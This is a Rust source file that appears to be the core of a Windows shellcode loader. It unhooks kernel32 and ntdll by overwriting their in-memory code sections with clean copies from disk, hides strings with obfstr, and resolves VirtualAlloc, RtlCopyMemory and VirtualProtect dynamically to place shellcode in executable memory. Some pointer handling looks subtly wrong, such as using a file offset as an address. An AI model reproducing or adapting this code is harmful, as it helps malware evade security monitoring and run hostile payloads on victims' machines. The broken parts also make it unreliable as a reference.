type Result<T, S = Status> = core::result::Result<T, S>;

#[derive(Debug)]
pub enum Status {
    NewStringFailed,
    GetModuleHandleAFailed,
    GetProcAddressFailed,
    AllocationFailed,
    MprotectFailed,
    FreeFailed
}

use std::{
    fs,
    ffi::OsStr,
    os::windows::ffi::OsStrExt
};

use winapi::ctypes::c_void;

// use std::fs;
// use std::ffi::c_void;
use goblin::pe::PE;

pub fn get_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

#[allow(unused_assignments)]
pub fn refresh_dlls() {
    // load dlls
    let kernel32_bytes = match fs::read(obfstr::obfstr!("C:\\Windows\\System32\\kernel32.dll")) {
        Err(_) => return,
        Ok(kernel32) => kernel32,
    };
    let kernelbase_bytes = match fs::read(obfstr::obfstr!("C:\\Windows\\System32\\KernelBase.dll")) {
        Err(_) => return,
        Ok(kernel32) => kernel32,
    };
    let ntdll_bytes = match fs::read(obfstr::obfstr!("C:\\Windows\\System32\\ntdll.dll")) {
        Err(_) => return,
        Ok(ntdll) => ntdll,
    };
    // parse dlls
    let kernel32 = PE::parse(&kernel32_bytes).unwrap();
    let kernelbase = PE::parse(&kernelbase_bytes).unwrap();
    let ntdll = PE::parse(&ntdll_bytes).unwrap();
    // find .text sections
    let mut k32_text_ptr: *mut c_void = 0 as _;
    let mut k32_text_size: usize = 0;
    let mut kernelbase_text_ptr: *mut c_void;
    let mut kernelbase_text_size: usize;
    let mut ntdll_text_ptr: *mut c_void = 0 as _;
    let mut ntdll_text_size: usize = 0;
    for i in 0..kernel32.sections.len() {
        if kernel32.sections[i].name().unwrap() == obfstr::obfstr!(".text") {
            k32_text_ptr = kernel32.sections[i].pointer_to_raw_data as *mut c_void;
            k32_text_size = kernel32.sections[i].size_of_raw_data as usize;
            break;
        }
    }
    for i in 0..kernelbase.sections.len() {
        if kernelbase.sections[i].name().unwrap() == obfstr::obfstr!(".text") {
            kernelbase_text_ptr = kernelbase.sections[i].pointer_to_raw_data as *mut c_void;
            kernelbase_text_size = kernelbase.sections[i].size_of_raw_data as usize;
            break;
        }
    }
    for i in 0..ntdll.sections.len() {
        if ntdll.sections[i].name().unwrap() == obfstr::obfstr!(".text") {
            ntdll_text_ptr = ntdll.sections[i].pointer_to_raw_data as *mut c_void;
            ntdll_text_size = ntdll.sections[i].size_of_raw_data as usize;
            break;
        }
    }
    // get dll handles
    let loaded_k32 = unsafe {winapi::um::libloaderapi::LoadLibraryExW(get_wide("kernel32.dll").as_ptr(), 0 as _, 0 as _)};
    let loaded_ntdll = unsafe {winapi::um::libloaderapi::LoadLibraryExW(get_wide("ntdll.dll").as_ptr(), 0 as _, 0 as _)};
    // get .text address of dll
    let loaded_k32_text = unsafe{(loaded_k32 as *mut c_void).offset(0x1000)};
    let loaded_ntdll_text = unsafe{(loaded_ntdll as *mut c_void).offset(0x1000)};
    // write .text section of known good bytes into potentially bad dlls in memory
    // kernel32
    let pid = std::process::id();
    let handle = unsafe {winapi::um::processthreadsapi::OpenProcess(
        winapi::um::winnt::PROCESS_ALL_ACCESS,
        0x01,
        pid
    )};
    let mut old_protect: u32 = 0;
    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
        handle,
        loaded_k32_text,
        k32_text_size,
        winapi::um::winnt::PAGE_EXECUTE_READWRITE,
        &mut old_protect
    )};
    let mut ret_len: usize = 0;
    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
        handle,
        loaded_k32_text,
        k32_text_ptr,
        k32_text_size,
        &mut ret_len
    )};
    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
        handle,
        loaded_k32_text,
        k32_text_size,
        old_protect,
        &mut old_protect
    )};
    // ntdll
    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
        handle,
        loaded_ntdll_text,
        ntdll_text_size,
        winapi::um::winnt::PAGE_EXECUTE_READWRITE,
        &mut old_protect
    )};
    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
        handle,
        loaded_ntdll_text,
        ntdll_text_ptr,
        ntdll_text_size,
        &mut ret_len
    )};
    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
        handle,
        loaded_ntdll_text,
        ntdll_text_size,
        old_protect,
        &mut old_protect
    )};
}

pub fn malloc_and_set_memory(shellcode: Vec<u8>) -> *mut core::ffi::c_void {
    use windows_sys::Win32::System::Memory::{

        MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE}; 
    
    if shellcode.is_empty() {
        return std::ptr::null_mut();
    }

    let alloc = get_virtual_alloc_address();
    if alloc.is_err() {
        if cfg!(debug_assertions) {
            println!("GetVirtualAllocAddress failed!");
        }
        return std::ptr::null_mut();
    }

    let rtl_copy = get_rtl_copy_memory_address();
    if rtl_copy.is_err() {
        if cfg!(debug_assertions) {
            println!("GetRtlCopyMemoryAddress failed!");
        }
        return std::ptr::null_mut();
    }

    let protect = get_virtual_protect_address();
    if protect.is_err() {
        if cfg!(debug_assertions) {
            println!("GetVirtualProtectAddress failed!");
        }
        return std::ptr::null_mut();
    }

    let alloc = alloc.unwrap();
    let rtl_copy = rtl_copy.unwrap();
    let protect = protect.unwrap();

    let alloc_func = unsafe { 
        std::mem::transmute::<*const core::ffi::c_void, 
        fn(*mut core::ffi::c_void, usize, u32, u32) 
        -> *mut core::ffi::c_void>(alloc)
    };
    let rtl_copy_func = unsafe { 
        std::mem::transmute::<*const core::ffi::c_void, 
        fn(*mut core::ffi::c_void, *const core::ffi::c_void, usize)>(rtl_copy) 
    };
    let protect_func = unsafe { 
        std::mem::transmute::<*const core::ffi::c_void, 
        fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32>(protect) 
    };

    let size = shellcode.len();
    let memory = alloc_func(std::ptr::null_mut(), 
               size, 
               MEM_COMMIT | MEM_RESERVE, 
               PAGE_READWRITE);
    if memory.is_null() {
        if cfg!(debug_assertions) {
            println!("VirtualAlloc failed!");
        }
        return std::ptr::null_mut();
    }
    let mut old_protect = PAGE_READWRITE;
    rtl_copy_func(memory, shellcode.as_ptr() as *const core::ffi::c_void, size);
    let ret = protect_func(memory, size, PAGE_EXECUTE, &mut old_protect);
    if ret == 0 {
        if cfg!(debug_assertions) {
            println!("VirtualProtect failed!");
        }
        return std::ptr::null_mut();
    }
    return memory;

}

pub fn get_symbol_address(module_name: &str, symbol_name: &str) -> Result<*const core::ffi::c_void> {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    use windows_sys::Win32::System::LibraryLoader::GetProcAddress;

    let module_name = std::ffi::CString::new(module_name);

    if module_name.is_err() {
        return Err(Status::NewStringFailed);
    }

    let module_name = module_name.unwrap();

    let symbol_name = std::ffi::CString::new(symbol_name);

    if symbol_name.is_err() {
        return Err(Status::NewStringFailed);
    }

    let symbol_name = symbol_name.unwrap();

    let module = unsafe { GetModuleHandleA(module_name.as_ptr() as *const u8) };

    let symbol = unsafe { GetProcAddress(module, symbol_name.as_ptr() as *const u8) };

    match symbol {
        Some(symbol) => {
            return Ok(symbol as *const core::ffi::c_void);
        },
        None => {
            return Err(Status::GetProcAddressFailed);
        }
    }
}


pub fn get_virtual_protect_address() -> Result<*const core::ffi::c_void> {
    return get_symbol_address("kernel32.dll", "VirtualProtect");
}


pub fn get_virtual_alloc_address() -> Result<*const core::ffi::c_void> {
    return get_symbol_address("kernel32.dll", "VirtualAlloc");
}


pub fn get_virtual_free_address() -> Result<*const core::ffi::c_void> {
    return get_symbol_address("kernel32.dll", "VirtualFree");
}


pub fn get_create_thread_address() -> Result<*const core::ffi::c_void> {
    return get_symbol_address("kernel32.dll", "CreateThread");
}


pub fn get_wait_for_single_object_address() -> Result<*const core::ffi::c_void> {
    return get_symbol_address("kernel32.dll", "WaitForSingleObject");
}


pub fn get_rtl_copy_memory_address() -> Result<*const core::ffi::c_void> {
    return get_symbol_address("ntdll.dll", "RtlCopyMemory");
}


